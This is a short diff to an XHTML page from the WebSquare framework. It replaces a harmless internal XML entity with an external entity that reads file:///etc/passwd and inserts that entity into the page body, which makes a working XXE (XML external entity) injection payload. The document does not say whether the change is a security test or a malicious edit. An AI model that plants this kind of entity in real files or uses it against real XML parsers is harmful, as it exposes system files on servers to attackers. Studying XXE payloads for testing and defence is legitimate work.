@@ -1,9 +1,6 @@
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE r [
-<!ELEMENT r ANY>
-<!ENTITY body "Don't forget me this weekend!">
-]>
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
 <html xmlns="http://www.w3.org/1999/xhtml" xmlns:ev="http://www.w3.org/2001/xml-events" xmlns:w2="http://www.inswave.com/websquare" xmlns:xf="http://www.w3.org/2002/xforms">
 	<head>
 		<w2:buildDate />
@@ -254,6 +251,6 @@
 		</xf:trigger>
 		<xf:group id="group5" style="clear:both;" class=""></xf:group>
 	</xf:group>
-	&body;
+	&ent;
 	</body>
 </html>
